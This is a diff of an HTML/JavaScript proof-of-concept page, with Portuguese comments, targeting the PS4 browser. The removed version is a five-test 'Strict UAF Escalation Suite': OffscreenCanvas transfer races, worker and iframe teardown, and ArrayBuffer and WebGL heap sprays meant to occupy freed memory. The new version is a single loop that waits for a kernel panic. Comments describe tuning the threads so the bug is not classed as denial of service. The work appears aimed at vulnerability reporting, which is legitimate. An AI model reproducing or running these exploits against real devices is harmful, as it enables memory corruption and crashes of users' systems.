@@ -1,213 +1,39 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 Exploit - Strict UAF & Heap Spray</title>
-    <style>
-        body { background-color: #0d0d0d; color: #00ffcc; font-family: monospace; padding: 20px; }
-        h1, h2 { color: #ff3366; border-bottom: 1px solid #333; padding-bottom: 5px; }
-        p { color: #cccccc; font-size: 14px; }
-        button {
-            background-color: #1a1a1a; color: #fff; border: 1px solid #00ffcc;
-            padding: 12px 15px; margin: 4px 0; cursor: pointer; width: 100%;
-            text-align: left; font-family: monospace; font-size: 14px; transition: 0.2s;
-        }
-        button:hover { background-color: #333; }
-        .stop-btn { background-color: #ff3366; color: white; border: 1px solid #fff; text-align: center; font-weight: bold; font-size: 16px; margin-top: 10px; }
-        #log-container { margin-top: 20px; padding: 15px; background-color: #000; border: 1px solid #333; height: 350px; overflow-y: auto; color: #fff; }
-        .log-entry { margin-bottom: 5px; }
-    </style>
+    <title>PoC - OffscreenCanvas IPC Teardown Leak</title>
 </head>
 <body>
-
-    <h1>[+] Strict UAF Escalation Suite</h1>
-    <p>Objetivo: Provar corrupção de memória com o mínimo de threads possível (Max 5), evitando a classificação de DoS.</p>
-
-    <button onclick="runStrictBaselineUAF()">[1] Strict Baseline UAF (Apenas 1 Worker ciclando)</button>
-    <button onclick="runDoubleTransferRace()">[2] Double-Transfer Race (Força Double-Free em 2 Workers)</button>
-    <button onclick="runUAFArrayBufferSpray()">[3] UAF + ArrayBuffer Spray (Tenta sobrescrever a fila IPC)</button>
-    <button onclick="runUAFWebGLTextureSpray()">[4] UAF + WebGL Texture Spray (Tenta sobrescrever a VRAM da AMD)</button>
-    <button onclick="runIframeTeardownBypass()">[5] Iframe Teardown Bypass (Destrói Realm em vez de Terminate)</button>
-
-    <br><br>
-    <button class="stop-btn" onclick="stopAll()">[ PARAR EXECUÇÃO / LIMPAR ]</button>
-
-    <div id="log-container"></div>
+    <h2>OffscreenCanvas IPC Teardown</h2>
+    <div id="log" style="font-family: monospace; font-size: 16px; background: #000; color: #0f0; padding: 10px;">Iniciando...</div>
 
     <script>
-        let currentInterval = null;
-        let sprayMemory = []; // Mantém o lixo na memória
-
-        function log(msg) {
-            const el = document.getElementById('log-container');
-            const time = new Date().toLocaleTimeString('pt-BR', { hour12: false, fractionalSecondDigits: 3 });
-            el.innerHTML += `<div class="log-entry">[${time}] ${msg}</div>`;
-            el.scrollTop = el.scrollHeight;
-        }
-
-        function stopAll() {
-            if (currentInterval) clearInterval(currentInterval);
-            currentInterval = null;
-            sprayMemory = []; // Liberta a memória do Heap Spray
-            log("[-] Execução interrompida. Memória pulverizada limpa.");
-        }
-
+        const logEl = document.getElementById('log');
+        // Worker vazio. A falha não é no código do worker, mas na destruição do seu contexto IPC.
         const workerCode = `onmessage = () => {};`;
         const url = URL.createObjectURL(new Blob([workerCode], {type: "text/javascript"}));
-
-        // --- [1] Strict Baseline UAF ---
-        // Usa estritamente 1 Worker de cada vez. Só cria o próximo depois de garantir a morte do anterior.
-        // Se a consola crashear aqui, é impossível a Sony dizer que é Thread Exhaustion.
-        function runStrictBaselineUAF() {
-            stopAll();
-            log("[*] Iniciando Strict Baseline UAF (Max 1 Worker vivo)...");
+        
+        let count = 0;
+        
+        // Loop conservador de 100ms: Garante que NUNCA há mais de 1 Worker ativo no sistema,
+        // descartando completamente qualquer alegação de Thread Exhaustion.
+        setInterval(() => {
+            const w = new Worker(url);
+            const canvas = new OffscreenCanvas(128, 128);
+            const transferred = canvas.transferToImageBitmap ? canvas.transferToImageBitmap() : canvas;
             
-            let count = 0;
-            currentInterval = setInterval(() => {
-                const w = new Worker(url);
-                const canvas = new OffscreenCanvas(128, 128);
-                const transferred = canvas.transferToImageBitmap ? canvas.transferToImageBitmap() : canvas;
-                
-                try { w.postMessage({canvas: transferred}, [transferred]); } catch(e) {}
-                
-                w.terminate(); // Mata instantaneamente
-                
-                count++;
-                if (count % 10 === 0) log(`Ciclos de Colisão (Apenas 1 thread ativa): ${count}`);
-                if (count > 200) { stopAll(); log("[+] Teste 1 finalizado."); }
-            }, 100); // 100ms garante que o kernel tem muito tempo para respirar
-        }
-
-        // --- [2] Double-Transfer Race ---
-        // Usa 2 Workers. Tenta enviar o MESMO ponteiro de VRAM para duas filas IPC diferentes.
-        function runDoubleTransferRace() {
-            stopAll();
-            log("[*] Iniciando Double-Transfer Race (Max 2 Workers vivos)...");
+            // 1. O WebKit mapeia a memória física e envia o ponteiro para a fila nativa do Worker
+            try { w.postMessage({canvas: transferred}, [transferred]); } catch(e) {}
             
-            let count = 0;
-            currentInterval = setInterval(() => {
-                const w1 = new Worker(url);
-                const w2 = new Worker(url);
-                const canvas = new OffscreenCanvas(128, 128);
-                const transferred = canvas.transferToImageBitmap ? canvas.transferToImageBitmap() : canvas;
-                
-                // GATILHO: Tenta o detach duplo
-                try { w1.postMessage({canvas: transferred}, [transferred]); } catch(e) {}
-                try { w2.postMessage({canvas: transferred}, [transferred]); } catch(e) {} // Deve falhar, mas a race existe
-                
-                w1.terminate();
-                w2.terminate();
-                
-                count++;
-                if (count % 10 === 0) log(`Ciclos de Double-Free: ${count}`);
-                if (count > 200) { stopAll(); log("[+] Teste 2 finalizado."); }
-            }, 100);
-        }
-
-        // --- [3] UAF + ArrayBuffer Spray ---
-        // Aqui o bug fica "forte". Destruímos a thread e imediatamente alocamos milhares de buffers
-        // para tentar ocupar o buraco de memória deixado pela mensagem IPC nativa que foi "libertada".
-        function runUAFArrayBufferSpray() {
-            stopAll();
-            sprayMemory = [];
-            log("[*] Iniciando UAF + ArrayBuffer Heap Spray...");
+            // 2. A aniquilação imediata impede o Garbage Collector normal e 
+            // falha em libertar o descritor de VRAM no driver da GPU do PS4.
+            w.terminate(); 
             
-            let count = 0;
-            currentInterval = setInterval(() => {
-                const w = new Worker(url);
-                const canvas = new OffscreenCanvas(128, 128);
-                const transferred = canvas.transferToImageBitmap ? canvas.transferToImageBitmap() : canvas;
-                
-                try { w.postMessage({canvas: transferred}, [transferred]); } catch(e) {}
-                
-                w.terminate(); // Liberta a estrutura C++ (UAF gerado)
-                
-                // GATILHO: Heap Spray agressivo imediatamente após o free()
-                for(let i = 0; i < 50; i++) {
-                    // Preenche com o valor 0x41414141 (AAAA) - Clássico para identificar controlo no crash dump
-                    let spray = new Uint32Array(1024);
-                    spray.fill(0x41414141); 
-                    sprayMemory.push(spray);
-                }
-                
-                // Limpa o spray antigo para não causar DoS de falta de memória (OOM)
-                if (sprayMemory.length > 2000) sprayMemory.splice(0, 1000); 
-                
-                count++;
-                if (count % 10 === 0) log(`Ciclos com Spray de RAM: ${count}`);
-                if (count > 200) { stopAll(); log("[+] Teste 3 finalizado."); }
-            }, 100);
-        }
-
-        // --- [4] UAF + WebGL Texture Spray ---
-        // Igual ao teste 3, mas tentamos sobrescrever a memória física da placa gráfica (AMD)
-        // usando buffers WebGL logo após o ponteiro do OffscreenCanvas ser libertado.
-        function runUAFWebGLTextureSpray() {
-            stopAll();
-            sprayMemory = [];
-            log("[*] Iniciando UAF + WebGL VRAM Spray...");
+            count++;
+            logEl.innerText = `Iterações de vazamento de IPC/VRAM: ${count}\nAguarde o Kernel Panic (~300)...`;
             
-            // Criamos um contexto WebGL persistente para o Spray
-            const glCanvas = document.createElement('canvas');
-            const gl = glCanvas.getContext('webgl');
-            if (!gl) return log("WebGL não suportado para este teste.");
-            
-            let count = 0;
-            currentInterval = setInterval(() => {
-                const w = new Worker(url);
-                const canvas = new OffscreenCanvas(128, 128);
-                const transferred = canvas.transferToImageBitmap ? canvas.transferToImageBitmap() : canvas;
-                
-                try { w.postMessage({canvas: transferred}, [transferred]); } catch(e) {}
-                
-                w.terminate(); // Liberta o ponteiro da textura na GPU
-                
-                // GATILHO: Tenta realocar imediatamente aquela textura livre
-                for(let i = 0; i < 10; i++) {
-                    let texture = gl.createTexture();
-                    gl.bindTexture(gl.TEXTURE_2D, texture);
-                    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 128, 128, 0, gl.RGBA, gl.UNSIGNED_BYTE, new Uint8Array(128 * 128 * 4).fill(0x42)); // 0x42 = 'B'
-                    sprayMemory.push(texture);
-                }
-                
-                if (sprayMemory.length > 200) {
-                    // Apaga as texturas mais velhas para evitar OOM puro
-                    for(let j=0; j<100; j++) gl.deleteTexture(sprayMemory.shift());
-                }
-                
-                count++;
-                if (count % 10 === 0) log(`Ciclos com Spray de VRAM: ${count}`);
-                if (count > 200) { stopAll(); log("[+] Teste 4 finalizado."); }
-            }, 100);
-        }
-
-        // --- [5] Iframe Teardown Bypass ---
-        // Evita usar o w.terminate() completamente. Criamos o Worker DENTRO de um Iframe,
-        // enviamos o Canvas, e destruímos o Iframe. Isso força a destruição do Realm (Contexto)
-        // por um caminho de C++ totalmente diferente.
-        function runIframeTeardownBypass() {
-            stopAll();
-            log("[*] Iniciando Iframe Teardown Bypass...");
-            
-            let count = 0;
-            currentInterval = setInterval(() => {
-                const iframe = document.createElement('iframe');
-                document.body.appendChild(iframe);
-                
-                const w = new iframe.contentWindow.Worker(url);
-                const canvas = new OffscreenCanvas(128, 128);
-                const transferred = canvas.transferToImageBitmap ? canvas.transferToImageBitmap() : canvas;
-                
-                try { w.postMessage({canvas: transferred}, [transferred]); } catch(e) {}
-                
-                // Em vez de w.terminate(), arrancamos a janela inteira.
-                document.body.removeChild(iframe); 
-                
-                count++;
-                if (count % 10 === 0) log(`Iframes destruídos com Workers pendentes: ${count}`);
-                if (count > 200) { stopAll(); log("[+] Teste 5 finalizado."); }
-            }, 100); // 100ms de folga
-        }
+        }, 100);
     </script>
 </body>
 </html>
